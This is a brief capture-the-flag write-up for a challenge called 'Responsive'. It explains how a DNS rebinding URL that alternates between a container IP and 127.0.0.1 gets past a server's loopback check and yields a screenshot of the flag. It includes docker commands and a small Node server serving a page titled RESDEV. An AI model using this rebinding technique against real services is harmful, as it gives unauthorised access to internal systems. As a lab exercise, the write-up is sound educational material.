# Responsive

* `docker build -t exploit .`
* `docker run --rm -p 80:80 exploit`

This challenge uses a web browser (Firefox for iOS) to access our website. This is essentially a baby DNS rebinding challenge. Our server needs RESDEV in the title, so let's just set up a simple JS server with node.

```Javascript
const url = require('url')
const http = require('http')

exploit_template = `
<html>
<title>RESDEV</title>
<head>Example</head>
<body>
    Hello world!
</body>
</html>`

const handler = (req, res) => {
    console.log("GET request");
    res.statusCode = 200;
    res.end(exploit_template);
}

const server = http.createServer(handler).listen(80, '0.0.0.0', (err) => {
    if (err) throw err
    console.log(`Attack server is listening on 80`)
})
```

We can then use Tavis Ormandy's website for testing DNS rebinding at Project Zero.

https://lock.cmpxchg8b.com/rebinder.html

Plugging in our server's IP address we get a URL like the one below:

```
http://7f000001.ac110002.rbndr.us/
```

If we submit this URL multiple times, one of those times the server will first resolve our URL to 172.17.0.2 which it verifies is not a loopback address. The server then opens a browser which asks what IP the URL is at. This second DNS request will resolve to 127.0.0.1, bypassing the initial check and returning a screenshot of the flag.
